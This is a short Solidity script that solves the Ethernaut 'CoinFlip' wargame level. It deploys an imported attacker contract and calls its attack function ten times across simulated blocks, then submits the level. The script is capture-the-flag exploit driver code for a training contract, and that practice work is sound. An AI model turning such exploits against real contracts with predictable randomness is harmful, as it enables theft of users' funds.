// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "../utils/Ethernaut.sol";
import "./CoinFlip.sol";
import "./CoinFlipAttacker.sol";

contract CoinFlipSolver is Ethernaut {
    function run() public broadcasted {
        CoinFlip instance = CoinFlip(getLevelInstance(Levels.coinflip));
        CoinFlipAttacker attacker = new CoinFlipAttacker(address(instance));

        for (uint256 i = 0; i < 10; i++) {
            vm.roll(1337 + i);
            attacker.attack();
        }

        submitLevelInstance(address(instance));
    }
}
